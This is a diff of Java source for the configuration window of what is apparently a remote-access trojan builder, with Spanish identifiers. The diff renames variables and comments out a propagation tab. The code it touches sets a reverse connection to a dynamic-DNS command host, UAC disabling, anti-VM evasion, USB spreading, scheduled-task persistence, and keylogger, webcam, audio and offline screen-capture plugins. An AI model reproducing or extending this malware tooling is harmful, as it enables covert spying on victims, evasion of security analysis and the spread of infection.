@@ -56,7 +56,7 @@ public class CrearCliente extends JFrame {
     public static String passCifradoCripter = "AJHSJKDFHASJDFHW2EFAHSDJFHASKA";
 //    public static String tipoLetra="--Times New Roman--";
     private JFileChooser cd = new JFileChooser();
-    private JButton btnCrearServer;
+    private JButton btnCrearCliente;
     private JButton btnGuardarPerfiles;
     private ConexionPanel panConexion;
     private CifradoPanel panelCifrado;
@@ -128,14 +128,13 @@ public class CrearCliente extends JFrame {
         perfilNuevo.agregarParametro("tipoConexion", ConexionServer.TCP);
         perfilNuevo.agregarParametro("ssl", "true");
         perfilNuevo.agregarParametro("puerto", "4000");
-//        perfilNuevo.agregarParametro("puerto2", "4002");
         perfilNuevo.agregarParametro("prefijo", "serv_");
         perfilNuevo.agregarParametro("dns", "minoip.ddns.net");
         perfilNuevo.agregarParametro("clave_acceso", panelCifrado.generarClave());
         perfilNuevo.agregarParametro("prog_tareas", "false");
         perfilNuevo.agregarParametro("delay", "3");
-        perfilNuevo.agregarParametro("delayCaptura", "3");
-        perfilNuevo.agregarParametro("offline", "true");
+        perfilNuevo.agregarParametro("off-escritorio", "true");
+        perfilNuevo.agregarParametro("off-escritorio-delay", "3");
         perfilNuevo.agregarParametro("usb", "false");
         perfilNuevo.agregarParametro("password", "");
         perfilNuevo.agregarParametro("inversa", "true");
@@ -196,7 +195,7 @@ public class CrearCliente extends JFrame {
         this.tabs.addTab("Conexión", Util.cargarIcono16("/resources/connect.png"), this.panConexion);
         this.tabs.addTab("Instalar", Util.cargarIcono16("/resources/puerto.png"), this.panelInstalar);
         this.tabs.addTab("Cifrado", Util.cargarIcono16("/resources/key.png"), this.panelCifrado);
-        this.tabs.addTab("Propagación", Util.cargarIcono16("/resources/virus.png"), this.panelPropagacion);
+//        this.tabs.addTab("Propagación", Util.cargarIcono16("/resources/virus.png"), this.panelPropagacion);
         this.tabs.addTab("Captura off-line", Util.cargarIcono16("/resources/spy.png"), this.panelEspiar);
         this.tabs.addTab("Funciones", Util.cargarIcono16("/resources/grid16.png"), this.panelOpciones);
         this.tabs.addTab("Plugins", Util.cargarIcono16("/resources/plugin.png"), this.panelPlugins);
@@ -263,12 +262,10 @@ public class CrearCliente extends JFrame {
 //            this.panConexion.getPuerto2().setValue(Integer.parseInt((String) p.obtenerParametro("puerto2")));
             this.panConexion.getDelay().setValue(Integer.parseInt((String) p.obtenerParametro("delay")));
             this.panConexion.getConexionInversa().setSelected(Boolean.valueOf((String) p.obtenerParametro("inversa")));
-
             this.panelCifrado.getKey().setText((String) p.obtenerParametro("clave_acceso"));
-
-            this.panelEspiar.getCapturaOfflinePantalla().setSelected(Boolean.valueOf((String) p.obtenerParametro("offline")));
+            this.panelEspiar.getCapturaOfflinePantalla().setSelected(Boolean.valueOf((String) p.obtenerParametro("off-escritorio")));
             try {
-                this.panelEspiar.getDelayCapturaPantalla().setValue(Integer.parseInt((String) p.obtenerParametro("delayCaptura")));
+                this.panelEspiar.getDelayCapturaPantalla().setValue(Integer.parseInt((String) p.obtenerParametro("off-escritorio-delay")));
             } catch (Exception e) {
             }
             this.panelPropagacion.getCheckUSB().setSelected(Boolean.valueOf((String) p.obtenerParametro("usb")));
@@ -279,7 +276,6 @@ public class CrearCliente extends JFrame {
             this.panelInstalar.getProgramadorTarea().setSelected(Boolean.valueOf((String) p.obtenerParametro("prog_tareas")));
             this.panelInstalar.getRegName().setText((String) p.obtenerParametro("reg_name"));
             this.panelInstalar.getFilename().setText((String) p.obtenerParametro("jar_name"));
-
             this.panelOpciones.getFn_Ventana().setSelected(Boolean.valueOf((String) p.obtenerParametro("fn_ventana")));
             this.panelOpciones.getFn_buscarArchivos().setSelected(Boolean.valueOf((String) p.obtenerParametro("fn_buscararchivos")));
             this.panelOpciones.getFn_capturaAudio().setSelected(Boolean.valueOf((String) p.obtenerParametro("fn_audio")));
@@ -287,7 +283,6 @@ public class CrearCliente extends JFrame {
             this.panelOpciones.getFn_capturaCamara().setSelected(Boolean.valueOf((String) p.obtenerParametro("fn_camara")));
             this.panelOpciones.getFn_desUAC().setSelected(Boolean.valueOf((String) p.obtenerParametro("fn_uac")));
             this.panelOpciones.getFn_descargararchivos().setSelected(Boolean.valueOf((String) p.obtenerParametro("fn_descarga_archivos")));
-
             this.panelPlugins.getAdjuntarPluginsJNA().setSelected(Boolean.valueOf((String) p.obtenerParametro("pg_jna")));
             this.panelPlugins.getAdjuntarPluginsKeylogger().setSelected(Boolean.valueOf((String) p.obtenerParametro("pg_keylogger")));
             this.panelPlugins.getAdjuntarPluginsWebCam().setSelected(Boolean.valueOf((String) p.obtenerParametro("pg_camara")));
@@ -389,7 +384,7 @@ public class CrearCliente extends JFrame {
         this.panelConstruir = new JPanel();
         panelEspiar = new EspiarPanel();
 
-        this.btnCrearServer = new JButton();
+        this.btnCrearCliente = new JButton();
         btnGuardarPerfiles = new JButton();
         this.logServer = new JTextArea();
         panelBinder = new JPanel();
@@ -498,7 +493,7 @@ public class CrearCliente extends JFrame {
 //                            CONSTRUIR SERVER
 //###############################################################################################################
         JToolBar barraInferior = new JToolBar();
-        barraInferior.add(this.btnCrearServer);
+        barraInferior.add(this.btnCrearCliente);
         barraInferior.add(this.btnGuardarPerfiles);
         barraInferior.setFloatable(false);
         JScrollPane scrollLog = new JScrollPane();
@@ -507,10 +502,10 @@ public class CrearCliente extends JFrame {
         this.panelConstruir.setLayout(new BorderLayout());
         panelConstruir.add(scrollLog, BorderLayout.CENTER);
         panelConstruir.add(barraInferior, BorderLayout.SOUTH);
-        this.btnCrearServer.setText("Crear Cliente");
-        this.btnCrearServer.setIcon(Util.cargarIcono16("/resources/computer.png"));
-        this.btnCrearServer.setToolTipText("Crea el cliente y guarda el perfil actual.");
-        this.btnCrearServer.addActionListener(new ActionListener() {
+        this.btnCrearCliente.setText("Crear Cliente");
+        this.btnCrearCliente.setIcon(Util.cargarIcono16("/resources/computer.png"));
+        this.btnCrearCliente.setToolTipText("Crea el cliente y guarda el perfil actual.");
+        this.btnCrearCliente.addActionListener(new ActionListener() {
             @Override
             public void actionPerformed(ActionEvent evt) {
                 CrearCliente.this.CrearServerActionPerformed(evt);
@@ -561,7 +556,6 @@ public class CrearCliente extends JFrame {
         cfg.agregarParametro("dns", panConexion.getTxtIpDNS().getText());
         cfg.agregarParametro("password", Encriptacion.MD5(new String(panConexion.getPassword().getPassword())));
         cfg.agregarParametro("puerto", Integer.valueOf(this.panConexion.getPuerto().getValue().toString()));
-//        cfg.agregarParametro("puerto2", Integer.valueOf(this.panConexion.getPuerto2().getValue().toString()));
         cfg.agregarParametro("delay", panConexion.getDelay().getValue());
         cfg.agregarParametro("avmw", panelANTIVM.getAntiVM_windows().isSelected());
         cfg.agregarParametro("avml", panelANTIVM.getAntiVM_linux().isSelected());
@@ -577,7 +571,6 @@ public class CrearCliente extends JFrame {
         cfg.agregarParametro("protocolo", protocolo);
         cfg.agregarParametro("uac", this.panelOpciones.getFn_desUAC().isSelected());
         cfg.agregarParametro("gui", this.panelOpciones.getFn_Ventana().isSelected());
-
         cfg.agregarParametro("usb", this.panelPropagacion.getCheckUSB().isSelected());
 
         if (this.panelPropagacion.getCheckUSB().isSelected()) {
